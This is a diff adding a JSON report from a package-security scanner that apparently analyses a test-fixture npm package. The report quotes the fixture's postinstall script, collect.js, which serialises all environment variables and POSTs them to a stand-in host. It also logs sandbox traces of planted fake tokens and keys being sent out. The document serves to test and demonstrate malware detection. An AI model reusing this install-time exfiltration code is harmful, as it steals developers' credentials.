@@ -1,0 +1,627 @@
+{
+  "package": {
+    "ecosystem": "npm",
+    "name": "pkgguard-fixture-postinstall-exfil",
+    "version": "1.0.0"
+  },
+  "analyzerVersion": "0.1.0",
+  "generatedAt": "2026-09-18T20:40:21.683807Z",
+  "findings": [
+    {
+      "ruleId": "metadata.install_script",
+      "layer": "metadata",
+      "severity": "MEDIUM",
+      "confidence": "HIGH",
+      "title": "Runs a 'postinstall' script during install",
+      "file": "package.json",
+      "line": null,
+      "snippet": "node collect.js",
+      "installTime": false,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.exfiltration",
+      "layer": "static",
+      "severity": "HIGH",
+      "confidence": "HIGH",
+      "title": "Reads secrets and can send data over the network during install",
+      "file": "collect.js",
+      "line": 2,
+      "snippet": "const payload = JSON.stringify(process.env);",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.env_dump",
+      "layer": "static",
+      "severity": "MEDIUM",
+      "confidence": "HIGH",
+      "title": "Reads all environment variables at once",
+      "file": "collect.js",
+      "line": 2,
+      "snippet": "const payload = JSON.stringify(process.env);",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.install_network",
+      "layer": "static",
+      "severity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "title": "Makes network requests during install",
+      "file": "collect.js",
+      "line": 3,
+      "snippet": "const req = https.request('https://collector.example.invalid/upload', { method: 'POST' });",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.canary_exfil",
+      "layer": "sandbox",
+      "severity": "HIGH",
+      "confidence": "HIGH",
+      "title": "Sent planted fake credentials (npm token, github token, aws access key id, aws secret access key, openai api key, database url) to collector.example.invalid",
+      "file": null,
+      "line": null,
+      "snippet": "http collector.example.invalid: env:NPM_TOKEN, env:GITHUB_TOKEN, env:AWS_ACCESS_KEY_ID, env:AWS_SECRET_ACCESS_KEY, env:OPENAI_API_KEY, env:DATABASE_URL",
+      "installTime": true,
+      "occurrences": 6
+    },
+    {
+      "ruleId": "sandbox.unexpected_network",
+      "layer": "sandbox",
+      "severity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "title": "Sends data to a host that is not the npm registry: collector.example.invalid",
+      "file": "collector.example.invalid",
+      "line": null,
+      "snippet": "https://collector.example.invalid/upload",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.env_recon",
+      "layer": "sandbox",
+      "severity": "LOW",
+      "confidence": "MEDIUM",
+      "title": "Collects environment variables or machine details",
+      "file": null,
+      "line": null,
+      "snippet": null,
+      "installTime": true,
+      "occurrences": 1
+    }
+  ],
+  "intel": {
+    "osv": {
+      "maliciousIds": [],
+      "vulnerabilityIds": []
+    },
+    "safedep": {
+      "found": false
+    }
+  },
+  "metadata": {
+    "description": null,
+    "license": null,
+    "publisher": "fixture-author",
+    "trustedPublishing": false,
+    "provenance": false,
+    "maintainers": [
+      "fixture-author"
+    ],
+    "publishedAt": "2026-03-02T20:40:21.541977+00:00",
+    "previousVersion": null,
+    "installScripts": {
+      "postinstall": "node collect.js"
+    },
+    "repository": "git+https://example.invalid/pkgguard-fixture-postinstall-exfil.git",
+    "dependencies": {},
+    "sha256": "a0f49a150e7577661f685f76c73c1cbbeacf5b2e0ad35fbc28cff0544fc59984",
+    "fileCount": 2,
+    "unpackedBytes": 316
+  },
+  "codeScan": {
+    "filesScanned": 1,
+    "filesParsed": 1,
+    "filesWithParseErrors": 0,
+    "installTimeFiles": [
+      "collect.js"
+    ],
+    "entryFiles": [],
+    "executables": [],
+    "skipped": [],
+    "findingsTruncated": false
+  },
+  "aiReview": null,
+  "aiError": null,
+  "behavior": {
+    "networkModules": [
+      "https"
+    ],
+    "hosts": [
+      "collector.example.invalid"
+    ],
+    "ipAddresses": [],
+    "envVars": [],
+    "readsAllEnv": true,
+    "sensitivePaths": [],
+    "runsCommands": false,
+    "dynamicCode": false,
+    "decodesData": false,
+    "readsMachineInfo": false,
+    "nativeExecutables": [],
+    "installTime": {
+      "network": true,
+      "commands": false,
+      "files": [
+        "collect.js"
+      ]
+    },
+    "filesByCapability": {
+      "network": [
+        "collect.js"
+      ],
+      "env_all": [
+        "collect.js"
+      ]
+    }
+  },
+  "iocs": [],
+  "fileHashes": [
+    {
+      "path": "collect.js",
+      "size": 186,
+      "sha256": "9f2b2dfcd91445b04df0d967daed1bc0586f36ab4a5dd00b77a8097c0bc70947"
+    },
+    {
+      "path": "package.json",
+      "size": 130,
+      "sha256": "5a0f5751bb0b1c06a6bf87ee0166693b49de05b6e631f622750998b84cafcef1"
+    }
+  ],
+  "fileHashesTruncated": false,
+  "settings": {
+    "analyzerVersion": "0.1.0",
+    "rulesHash": "cdd49f6359d5",
+    "promptHashes": {},
+    "ai": {
+      "mode": "off"
+    },
+    "settingsHash": "c9edcfb6b502"
+  },
+  "timings": {
+    "downloadSeconds": 0.005,
+    "unpackSeconds": 0.014,
+    "intelSeconds": 0.002,
+    "metadataSeconds": 0.046,
+    "codeScanSeconds": 0.044,
+    "sandboxSeconds": 0.024,
+    "aiSeconds": 0.002,
+    "totalSeconds": 0.139
+  },
+  "reviewFlags": {
+    "rulesAiDisagree": false,
+    "workerCoordinatorDisagree": false,
+    "promptInjectionDetected": false,
+    "lowCoverage": false,
+    "aiFailed": false,
+    "needsHumanReview": false,
+    "reasons": []
+  },
+  "codeIssues": [
+    {
+      "id": "issue-1",
+      "file": "collect.js",
+      "lineStart": 2,
+      "lineEnd": 3,
+      "severity": "HIGH",
+      "category": "secret_theft",
+      "title": "Reads secrets and can send data over the network during install",
+      "whyItMatters": "This code reads secrets or machine details and can send data over the network. That combination is how credentials get stolen.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "code.exfiltration",
+        "code.env_dump",
+        "code.install_network"
+      ],
+      "aiAssessment": null,
+      "installTime": true,
+      "excerpt": {
+        "startLine": 1,
+        "endLine": 5,
+        "highlightStart": 2,
+        "highlightEnd": 3,
+        "lines": [
+          {
+            "number": 1,
+            "text": "const https = require('https');",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 2,
+            "text": "const payload = JSON.stringify(process.env);",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 3,
+            "text": "const req = https.request('https://collector.example.invalid/upload', { method: 'POST' });",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 4,
+            "text": "req.end(payload);",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 5,
+            "text": "",
+            "highlighted": false,
+            "clipped": false
+          }
+        ]
+      }
+    },
+    {
+      "id": "issue-2",
+      "file": "package.json",
+      "lineStart": 5,
+      "lineEnd": 5,
+      "severity": "MEDIUM",
+      "category": "install_script",
+      "title": "Runs a 'postinstall' script during install",
+      "whyItMatters": "This command runs automatically during npm install, before any code is imported. Malware most often starts here.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "metadata.install_script"
+      ],
+      "aiAssessment": null,
+      "installTime": false,
+      "excerpt": {
+        "startLine": 2,
+        "endLine": 8,
+        "highlightStart": 5,
+        "highlightEnd": 5,
+        "lines": [
+          {
+            "number": 2,
+            "text": "  \"name\": \"pkgguard-fixture-postinstall-exfil\",",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 3,
+            "text": "  \"version\": \"1.0.0\",",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 4,
+            "text": "  \"scripts\": {",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 5,
+            "text": "    \"postinstall\": \"node collect.js\"",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 6,
+            "text": "  }",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 7,
+            "text": "}",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 8,
+            "text": "",
+            "highlighted": false,
+            "clipped": false
+          }
+        ]
+      }
+    }
+  ],
+  "sandbox": {
+    "version": "0.1.0",
+    "status": "COMPLETE",
+    "skipReason": null,
+    "durationSeconds": 1.7,
+    "rawTraceS3Key": "sandbox-traces/npm/pkgguard-fixture-postinstall-exfil/1.0.0/0.1.0.json",
+    "coverage": {
+      "installed": true,
+      "installScriptsRan": true,
+      "entryLoaded": false,
+      "entryError": "Cannot find module 'pkgguard-fixture-postinstall-exfil'\nRequire stack:\n- /opt/sbx/loader.js",
+      "binsRun": 0,
+      "timedOut": false,
+      "dependenciesStripped": true
+    },
+    "runs": [
+      {
+        "name": "baseline",
+        "ci": false,
+        "clockOffsetDays": 0,
+        "hostname": "container",
+        "user": "sandbox",
+        "phases": [
+          {
+            "name": "install",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 1.41,
+            "cpuSeconds": 1.22
+          },
+          {
+            "name": "require",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 0.17,
+            "cpuSeconds": 0.11
+          }
+        ],
+        "notes": []
+      },
+      {
+        "name": "hostile",
+        "ci": true,
+        "clockOffsetDays": 60,
+        "hostname": "ci-runner-04",
+        "user": "runner",
+        "phases": [
+          {
+            "name": "install",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 1.62,
+            "cpuSeconds": 1.4
+          },
+          {
+            "name": "require",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 0.12,
+            "cpuSeconds": 0.09
+          }
+        ],
+        "notes": []
+      }
+    ],
+    "network": [
+      {
+        "run": "baseline",
+        "kind": "dns",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": null,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": null,
+        "count": 3
+      },
+      {
+        "run": "baseline",
+        "kind": "http",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": 443,
+        "method": "POST",
+        "url": "https://collector.example.invalid/upload",
+        "bodyPreview": "{\"GITHUB_TOKEN\":\"ghx_ztxE48mHlAaV93Yo6t13etFZTTj6i4lpqOqf\",\"npm_package_dev\":\"\",\"USER\":\"sandbox\",\"NODE_EXTRA_CA_CERTS\":\"/opt/sbx/ca.pem\",\"DATABASE_URL\":\"postgres://app:0duGzlbm4eZlNKQE@db.internal:5432/app\",\"npm_config_user_agent\":\"npm/10.8.2 node/v20.20.2 linux arm64 workspaces/false\",\"npm_node_execpath\":\"/usr/local/bin/node\",\"npm_package_resolved\":\"file:/tmp/sbx/pkg.tgz\",\"npm_config_noproxy\":\"\",\"HOME\":\"/home/sandbox\",\"npm_package_optional\":\"\",\"npm_package_json\":\"/home/sandbox/project/node_modules/pkgguard-fixture-postinstall-exfil/package.json\",\"NODE_OPTIONS\":\"--require /opt/sbx/hook.js\",\"OPENAI_API_KEY\":\"sx-O2D9Wmz6HjYV4OpEIjui7ILtGDXAXFbCE5U1u5FGx3XLwdSx\",\"npm_config_userconfig\":\"/home/sandbox/.npmrc\",\"npm_config_local_prefix\":\"/home/sandbox/project\",\"npm_package_integrity\":\"sha512-nSPv/Z0w8xJKcwRJzksJjZPE8XJHCigWvgA7uB7RRUIoYPuVei3V+uO5rQPHcZciMvUPnOFQOfKuCqRHhuntLA==\",\"COLOR\":\"0\",\"NPM_TOKEN\":\"npx_WlXvRldSjXr0ntUZIU5yBtGHpEuRvvT0d71V\",\"npm_config_package_lock\":\"\",\"npm_config_audit\":\"\",\"LOGNAME\":\"sandbox\",\"npm_config_prefix\":\"/usr/local\",\"npm_config_npm_version\":\"10.8.2\",\"TERM\":\"xterm\",\"npm_config_cache\":\"/home/sandbox/.npm\",\"npm_config_node_gyp\":\"/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js\",\"PATH\":\"/home/sandbox/project/node_modules/pkgguard-fixture-postinstall-exfil/node_modules/.bin:/home/sandbox/project/node_modules/node_modules/.bin:/home/sandbox/project/node_modules/.bin:/home/sandbox/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE\":\"/usr/local/bin/node\",\"npm_package_name\":\"pkgguard-fixture-postinstall-exfil\",\"npm_config_offline\":\"true\",\"LANG\":\"C.UTF-8\",\"SBX_HOOK_LOG\":\"/var/sbx/hook/hook.jsonl\",\"npm_config_fund\":\"\",\"npm_config_loglevel\":\"error\",\"npm_lifecycle_script\":\"node collect.js\",\"SHELL\":\"/bin/bash\",\"npm_package_version\":\"1.0.0\",\"npm_lifecycle_event\":\"postinstall\",\"n",
+        "canaryHit": true,
+        "phase": null,
+        "count": 2
+      },
+      {
+        "run": "baseline",
+        "kind": "connect",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": 443,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": "install",
+        "count": 2
+      },
+      {
+        "run": "hostile",
+        "kind": "dns",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": null,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": null,
+        "count": 3
+      },
+      {
+        "run": "hostile",
+        "kind": "http",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": 443,
+        "method": "POST",
+        "url": "https://collector.example.invalid/upload",
+        "bodyPreview": "{\"GITHUB_TOKEN\":\"ghx_K0f2TnLykaJ0SGxHg6pwuBwWSe5LBeFGKTde\",\"npm_package_dev\":\"\",\"USER\":\"sandbox\",\"NODE_EXTRA_CA_CERTS\":\"/opt/sbx/ca.pem\",\"DATABASE_URL\":\"postgres://app:KGRgxHr1fQn1nPmI@db.internal:5432/app\",\"npm_config_user_agent\":\"npm/10.8.2 node/v20.20.2 linux arm64 workspaces/false ci/github-actions\",\"CI\":\"true\",\"npm_node_execpath\":\"/usr/local/bin/node\",\"npm_package_resolved\":\"file:/tmp/sbx/pkg.tgz\",\"npm_config_noproxy\":\"\",\"HOME\":\"/home/sandbox\",\"npm_package_optional\":\"\",\"npm_package_json\":\"/home/sandbox/project/node_modules/pkgguard-fixture-postinstall-exfil/package.json\",\"NODE_OPTIONS\":\"--require /opt/sbx/hook.js\",\"OPENAI_API_KEY\":\"sx-fcIBNn2cJghvyEph8adG2MnMDdX3uyxILQN6cXDZBDEs3Ufn\",\"FAKETIME_NO_CACHE\":\"1\",\"npm_config_userconfig\":\"/home/sandbox/.npmrc\",\"npm_config_local_prefix\":\"/home/sandbox/project\",\"npm_package_integrity\":\"sha512-EnTwlLRCtAho3qGhEtejmBEUuz4r0b9my/zbUREsxfiuJbj3cE5nlkyThf+KH6X2zDABi6icCCrBrI49utElcg==\",\"COLOR\":\"0\",\"NPM_TOKEN\":\"npx_i6ZJEXk2uel0s97xpKGriVar4Y7wkakwrp0Q\",\"SBX_FAKE_USER\":\"runner\",\"FAKETIME_SHARED\":\"/faketime_sem_28 /faketime_shm_28\",\"npm_config_package_lock\":\"\",\"npm_config_audit\":\"\",\"LOGNAME\":\"sandbox\",\"RUNNER_OS\":\"Linux\",\"npm_config_prefix\":\"/usr/local\",\"npm_config_npm_version\":\"10.8.2\",\"TERM\":\"xterm\",\"npm_config_cache\":\"/home/sandbox/.npm\",\"npm_config_node_gyp\":\"/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js\",\"PATH\":\"/home/sandbox/project/node_modules/pkgguard-fixture-postinstall-exfil/node_modules/.bin:/home/sandbox/project/node_modules/node_modules/.bin:/home/sandbox/project/node_modules/.bin:/home/sandbox/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE\":\"/usr/local/bin/node\",\"npm_package_name\":\"pkgguard-fixture-postinstall-exfil\",\"npm_config_offline\":\"true\",\"LANG\":\"C.UTF-8\",\"SBX_HOOK_LOG\":\"/var/sbx/hook/hook.jsonl\",\"LD_PRELOAD\":\"/usr/lib/aarc",
+        "canaryHit": true,
+        "phase": null,
+        "count": 2
+      },
+      {
+        "run": "hostile",
+        "kind": "connect",
+        "classification": "unexpected",
+        "host": "collector.example.invalid",
+        "ip": null,
+        "port": 443,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": "install",
+        "count": 2
+      }
+    ],
+    "processes": [
+      {
+        "run": "baseline",
+        "pid": 39,
+        "ppid": 28,
+        "exe": "/usr/bin/sh",
+        "argv": [
+          "sh",
+          "-c",
+          "node collect.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "baseline",
+        "pid": 40,
+        "ppid": 39,
+        "exe": "/usr/local/bin/node",
+        "argv": [
+          "node",
+          "collect.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 39,
+        "ppid": 28,
+        "exe": "/usr/bin/sh",
+        "argv": [
+          "sh",
+          "-c",
+          "node collect.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 40,
+        "ppid": 39,
+        "exe": "/usr/local/bin/node",
+        "argv": [
+          "node",
+          "collect.js"
+        ],
+        "phase": "install"
+      }
+    ],
+    "files": [],
+    "evalPayloads": [],
+    "canaryHits": [
+      {
+        "canaryId": "env:NPM_TOKEN",
+        "decoyPath": null,
+        "sink": "http collector.example.invalid",
+        "run": "hostile"
+      },
+      {
+        "canaryId": "env:GITHUB_TOKEN",
+        "decoyPath": null,
+        "sink": "http collector.example.invalid",
+        "run": "hostile"
+      },
+      {
+        "canaryId": "env:AWS_ACCESS_KEY_ID",
+        "decoyPath": null,
+        "sink": "http collector.example.invalid",
+        "run": "hostile"
+      },
+      {
+        "canaryId": "env:AWS_SECRET_ACCESS_KEY",
+        "decoyPath": null,
+        "sink": "http collector.example.invalid",
+        "run": "hostile"
+      },
+      {
+        "canaryId": "env:OPENAI_API_KEY",
+        "decoyPath": null,
+        "sink": "http collector.example.invalid",
+        "run": "hostile"
+      },
+      {
+        "canaryId": "env:DATABASE_URL",
+        "decoyPath": null,
+        "sink": "http collector.example.invalid",
+        "run": "hostile"
+      }
+    ],
+    "conditional": [],
+    "resources": {
+      "peakCpuSeconds": 1.4,
+      "peakMemoryMb": 77.3,
+      "timedOutPhases": []
+    },
+    "findings": [
+      {
+        "ruleId": "sandbox.canary_exfil",
+        "layer": "sandbox",
+        "severity": "HIGH",
+        "confidence": "HIGH",
+        "title": "Sent planted fake credentials (npm token, github token, aws access key id, aws secret access key, openai api key, database url) to collector.example.invalid",
+        "file": null,
+        "line": null,
+        "snippet": "http collector.example.invalid: env:NPM_TOKEN, env:GITHUB_TOKEN, env:AWS_ACCESS_KEY_ID, env:AWS_SECRET_ACCESS_KEY, env:OPENAI_API_KEY, env:DATABASE_URL",
+        "installTime": true,
+        "occurrences": 6
+      },
+      {
+        "ruleId": "sandbox.unexpected_network",
+        "layer": "sandbox",
+        "severity": "MEDIUM",
+        "confidence": "MEDIUM",
+        "title": "Sends data to a host that is not the npm registry: collector.example.invalid",
+        "file": "collector.example.invalid",
+        "line": null,
+        "snippet": "https://collector.example.invalid/upload",
+        "installTime": true,
+        "occurrences": 1
+      },
+      {
+        "ruleId": "sandbox.env_recon",
+        "layer": "sandbox",
+        "severity": "LOW",
+        "confidence": "MEDIUM",
+        "title": "Collects environment variables or machine details",
+        "file": null,
+        "line": null,
+        "snippet": null,
+        "installTime": true,
+        "occurrences": 1
+      }
+    ]
+  },
+  "humanReview": null
+}
